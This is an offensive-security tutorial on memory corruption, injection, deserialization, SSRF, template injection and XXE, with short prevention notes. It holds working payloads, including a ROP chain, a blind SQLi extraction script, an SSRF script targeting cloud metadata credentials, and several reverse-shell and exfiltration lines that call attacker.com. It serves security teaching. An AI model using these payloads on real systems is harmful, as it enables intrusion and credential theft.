# Advanced Exploitation Techniques

Beyond basic attacks, sophisticated threat actors use advanced exploitation techniques to compromise systems, evade detection, and maintain persistence. This lesson explores modern exploitation methods used in real-world attacks.

## Memory Corruption Exploits

### Buffer Overflows

**How it works:**
Program writes data beyond buffer boundary, overwriting adjacent memory.

**Stack buffer overflow example:**
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

**Exploitation:**
```python
import struct

# Create payload
buffer_size = 64
padding = b"A" * buffer_size

# Overwrite saved EIP (return address)
# This is the address we want to jump to
new_eip = struct.pack("<I", 0x08048484)  # Address of shellcode

# Add shellcode (or ROP chain)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."

payload = padding + new_eip + shellcode
print(payload)
```

**Modern protections:**
- **ASLR (Address Space Layout Randomization)**: Randomizes memory locations
- **DEP/NX (Data Execution Prevention)**: Marks stack as non-executable
- **Stack canaries**: Detects buffer overflow before return
- **RELRO**: Makes GOT read-only

### Return-Oriented Programming (ROP)

**Bypasses DEP/NX by reusing existing code.**

**How it works:**
- Find "gadgets" (instruction sequences ending in `ret`)
- Chain gadgets together
- Execute existing code in new order

**Example gadgets:**
```assembly
; Gadget 1: pop rdi; ret
0x00401234: pop rdi
0x00401235: ret

; Gadget 2: pop rsi; ret
0x00401240: pop rsi
0x00401241: ret

; Gadget 3: syscall; ret
0x00401250: syscall
0x00401251: ret
```

**ROP chain to call execve("/bin/sh", NULL, NULL):**
```python
import struct

def p64(addr):
    return struct.pack("<Q", addr)

# Build ROP chain
rop_chain = b""
rop_chain += p64(0x00401234)  # pop rdi; ret
rop_chain += p64(0x00601234)  # address of "/bin/sh"
rop_chain += p64(0x00401240)  # pop rsi; ret
rop_chain += p64(0x0)         # NULL
rop_chain += p64(0x00401245)  # pop rdx; ret
rop_chain += p64(0x0)         # NULL
rop_chain += p64(0x00401250)  # syscall; ret

payload = b"A" * 72 + rop_chain
```

**Finding gadgets:**
```bash
# Using ROPgadget
ROPgadget --binary vulnerable_binary

# Using ropper
ropper --file vulnerable_binary --search "pop rdi"
```

### Heap Exploitation

**Heap overflow:**
Overwrite heap metadata to control allocations.

**Use-after-free:**
Access memory after it's been freed.

```c
// Use-after-free vulnerability
#include <stdlib.h>
#include <string.h>

struct object {
    void (*function_pointer)(void);
    char data[64];
};

void legitimate_function() {
    printf("Normal operation\n");
}

void evil_function() {
    printf("Compromised!\n");
    // Execute shellcode
}

int main() {
    struct object *obj = malloc(sizeof(struct object));
    obj->function_pointer = legitimate_function;
    strcpy(obj->data, "Some data");
    
    // Use object
    obj->function_pointer();
    
    // Free object
    free(obj);
    
    // VULNERABILITY: Still have pointer to freed memory
    // Attacker can allocate new memory in same location
    // and control function_pointer
    
    // Later use (after free)
    obj->function_pointer();  // Now calls attacker-controlled address
    
    return 0;
}
```

**Exploitation:**
1. Trigger use-after-free
2. Allocate new object in freed location
3. Control function pointer
4. Trigger function call

## Format String Vulnerabilities

**Occurs when user input is used as format string.**

**Vulnerable code:**
```c
#include <stdio.h>

void vulnerable(char *input) {
    printf(input);  // VULNERABLE!
}

// Should be:
// printf("%s", input);
```

**Exploitation capabilities:**

**Read memory:**
```bash
# %x reads from stack
./vulnerable "%x %x %x %x"

# %s reads string from address
./vulnerable "%s" 

# Direct parameter access
./vulnerable "%10$x"  # Reads 10th parameter
```

**Write memory:**
```bash
# %n writes number of bytes printed so far
./vulnerable "AAAA%n"  # Writes 4 to address AAAA

# Write arbitrary value
./vulnerable "%100x%n"  # Writes 100

# Write to specific address
./vulnerable "\x04\x03\x02\x01%10$n"
```

**Exploitation example:**
```python
#!/usr/bin/env python3
import struct

def p32(addr):
    return struct.pack("<I", addr)

# Target: overwrite GOT entry for printf
got_printf = 0x08049a30
shellcode_addr = 0xbffff700

# Calculate values to write
value_to_write = shellcode_addr

# Build exploit
exploit = b""
exploit += p32(got_printf)      # Address to write to
exploit += p32(got_printf + 1)  # Write to each byte
exploit += p32(got_printf + 2)
exploit += p32(got_printf + 3)

# Use %n to write values
exploit += b"%12$n"   # Write to first address
# ... (calculate proper widths for each byte)

print(exploit)
```

## SQL Injection - Advanced

### Second-Order SQL Injection

**Data is stored, then later used in SQL query.**

**Example:**
```python
# First request - store malicious data
username = "admin'--"
db.execute("INSERT INTO users (username) VALUES (?)", (username,))

# Second request - vulnerable query uses stored data
stored_username = db.execute("SELECT username FROM users WHERE id=1").fetchone()[0]
# stored_username is now "admin'--"

# VULNERABLE: Uses stored data without sanitization
results = db.execute(f"SELECT * FROM posts WHERE author='{stored_username}'")
# Becomes: SELECT * FROM posts WHERE author='admin'--'
```

**Prevention:** Sanitize data on output, not just input.

### Blind SQL Injection

**No direct output, must infer results.**

**Time-based blind SQLi:**
```sql
-- If condition true, delay 5 seconds
' OR IF(1=1, SLEEP(5), 0)--

-- Extract database name character by character
' OR IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)--
' OR IF(SUBSTRING(DATABASE(),1,1)='b', SLEEP(5), 0)--
-- ... continue for each character
```

**Boolean-based blind SQLi:**
```sql
-- Test if condition is true
' AND 1=1--  (page loads normally)
' AND 1=2--  (page different or error)

-- Extract data bit by bit
' AND ASCII(SUBSTRING(DATABASE(),1,1))>97--
' AND ASCII(SUBSTRING(DATABASE(),1,1))>109--
-- Binary search to find exact value
```

**Automated extraction:**
```python
import requests
import time

def extract_database_name(url):
    db_name = ""
    position = 1
    
    while True:
        found_char = False
        
        # Try each character
        for ascii_val in range(32, 127):
            payload = f"' AND ASCII(SUBSTRING(DATABASE(),{position},1))={ascii_val}--"
            
            start = time.time()
            response = requests.get(url, params={'id': payload})
            duration = time.time() - start
            
            # If response delayed, character is correct
            if duration > 5:
                db_name += chr(ascii_val)
                position += 1
                found_char = True
                print(f"Found: {db_name}")
                break
        
        if not found_char:
            break
    
    return db_name

# Usage
db = extract_database_name("http://example.com/page.php")
print(f"Database name: {db}")
```

### NoSQL Injection

**Targets MongoDB, CouchDB, etc.**

**Example (MongoDB):**
```javascript
// Vulnerable query
db.users.find({
    username: req.body.username,
    password: req.body.password
})

// Attack payload
username[$ne]=null&password[$ne]=null

// Becomes: Find where username != null AND password != null
// Returns all users!
```

**More examples:**
```javascript
// Bypass authentication
{"username": {"$ne": null}, "password": {"$ne": null}}

// Extract data
{"username": {"$regex": "^admin"}}  // Starts with "admin"
{"username": {"$regex": "^a"}}      // Starts with "a"

// JavaScript injection (if allowed)
{"$where": "this.username == 'admin' || '1'=='1'"}
```

**Prevention:**
```javascript
// Cast to string
username: String(req.body.username)

// Validate type
if (typeof req.body.username !== 'string') {
    return res.status(400).send('Invalid input');
}

// Use parameterized queries
db.users.findOne({
    username: { $eq: req.body.username },
    password: { $eq: req.body.password }
})
```

## Deserialization Attacks

**Exploits insecure deserialization of objects.**

### Python Pickle RCE

```python
import pickle
import os

# Malicious class
class Exploit:
    def __reduce__(self):
        # This executes when unpickled
        return (os.system, ('nc attacker.com 4444 -e /bin/sh',))

# Serialize malicious object
evil_data = pickle.dumps(Exploit())

# Victim deserializes
pickle.loads(evil_data)  # EXECUTES COMMAND!
```

### Java Deserialization

**Apache Commons Collections vulnerability:**

```java
// Vulnerable code
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // DANGEROUS!
```

**Exploitation using ysoserial:**
```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'nc attacker.com 4444 -e /bin/sh' | base64

# Send to vulnerable endpoint
curl -X POST http://victim.com/api -d @payload
```

### PHP Unserialize

```php
<?php
// Vulnerable code
$user = unserialize($_COOKIE['user']);

// Malicious serialized object
class Evil {
    private $command;
    
    function __wakeup() {
        system($this->command);
    }
}

$evil = new Evil();
$evil->command = "nc attacker.com 4444 -e /bin/sh";
echo serialize($evil);
?>
```

**Prevention:**
- Never deserialize untrusted data
- Use JSON instead of native serialization
- Implement integrity checks (HMAC)
- Whitelist allowed classes

## Server-Side Request Forgery (SSRF)

**Trick server into making requests to internal resources.**

### Basic SSRF

```python
# Vulnerable code
import requests

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)
    return response.content
```

**Exploitation:**
```bash
# Access internal services
http://victim.com/fetch?url=http://localhost:6379/
# Access Redis

http://victim.com/fetch?url=http://169.254.169.254/latest/meta-data/
# Access AWS metadata

http://victim.com/fetch?url=http://internal-server/admin
# Access internal admin panel

http://victim.com/fetch?url=file:///etc/passwd
# Read local files
```

### Advanced SSRF

**Bypass filters:**
```bash
# URL encoding
http://victim.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/

# Alternative representations
http://victim.com/fetch?url=http://127.1/
http://victim.com/fetch?url=http://0x7f000001/

# DNS rebinding
http://victim.com/fetch?url=http://attacker-controlled-domain/
# Domain resolves to internal IP

# Protocol smuggling
http://victim.com/fetch?url=gopher://internal-server:6379/_FLUSHALL
# Use gopher to send arbitrary data
```

**Exploitation script:**
```python
#!/usr/bin/env python3
import requests

def ssrf_exploit(target_url, internal_url):
    """Exploit SSRF to access internal resource"""
    
    # Various bypass techniques
    payloads = [
        internal_url,
        internal_url.replace('127.0.0.1', 'localhost'),
        internal_url.replace('127.0.0.1', '127.1'),
        internal_url.replace('http://', 'http://127.0.0.1@'),
        f"http://attacker.com@{internal_url.split('//')[1]}",
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                target_url,
                params={'url': payload},
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"[+] Success with: {payload}")
                print(response.text[:500])
                return response.text
        except:
            continue
    
    print("[-] All payloads failed")
    return None

# Exploit cloud metadata
ssrf_exploit(
    'http://victim.com/fetch',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
)
```

## Template Injection

**Server-Side Template Injection (SSTI)**

**Vulnerable code (Jinja2/Python):**
```python
from flask import Flask, request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = f"Hello {name}!"  # VULNERABLE!
    return render_template_string(template)
```

**Detection:**
```bash
# Test for injection
http://victim.com/hello?name={{7*7}}
# If output is "49", vulnerable!

# Identify template engine
{{7*'7'}}  # Jinja2: 7777777
${7*7}     # Freemarker: 49
<%= 7*7 %> # ERB: 49
```

**Exploitation (Jinja2):**
```python
# Read files
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }}

# Execute commands
{{ config.__class__.__init__.__globals__['os'].popen('nc attacker.com 4444 -e /bin/sh').read() }}

# More compact
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {{ c.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
{% endif %}
{% endfor %}
```

**Exploitation tool:**
```python
#!/usr/bin/env python3
import requests

def ssti_exploit(url, param):
    """Exploit SSTI vulnerability"""
    
    # Test if vulnerable
    test_payload = "{{7*7}}"
    response = requests.get(url, params={param: test_payload})
    
    if "49" in response.text:
        print("[+] SSTI vulnerability confirmed!")
        
        # RCE payload for Jinja2
        rce_payload = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
        
        response = requests.get(url, params={param: rce_payload})
        print(f"[+] Command output:\n{response.text}")
    else:
        print("[-] Not vulnerable or different template engine")

# Usage
ssti_exploit('http://victim.com/hello', 'name')
```

## XML External Entity (XXE) Injection

**Exploits XML parsers that process external entities.**

**Vulnerable code:**
```php
<?php
$xml = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT);  // VULNERABLE!
?>
```

**Basic XXE - Read files:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Blind XXE - Out-of-band:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

**evil.dtd on attacker server:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**XXE to SSRF:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>
  <data>&xxe;</data>
</root>
```

**Prevention:**
```python
# Python
from defusedxml import ElementTree
tree = ElementTree.parse(xml_file)

# PHP
libxml_disable_entity_loader(true);

# Java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

## Key Takeaways

**Modern exploitation requires:**
- Deep understanding of memory layout
- Knowledge of protection bypasses
- Creative chaining of vulnerabilities
- Patience and persistence

**Common patterns:**
- Information disclosure → Exploit development
- Authentication bypass → Privilege escalation
- SSRF → Internal network access
- Deserialization → Remote code execution

**Defense strategies:**
- Input validation everywhere
- Principle of least privilege
- Defense in depth
- Regular security audits
- Bug bounty programs

**Remember:**
- These techniques are for authorized testing only
- Always have written permission
- Document everything
- Report responsibly
- Continuous learning is essential

Advanced exploitation is constantly evolving. Stay current with new techniques, study real-world exploits, and practice in legal environments like HackTheBox, TryHackMe, and bug bounty programs.
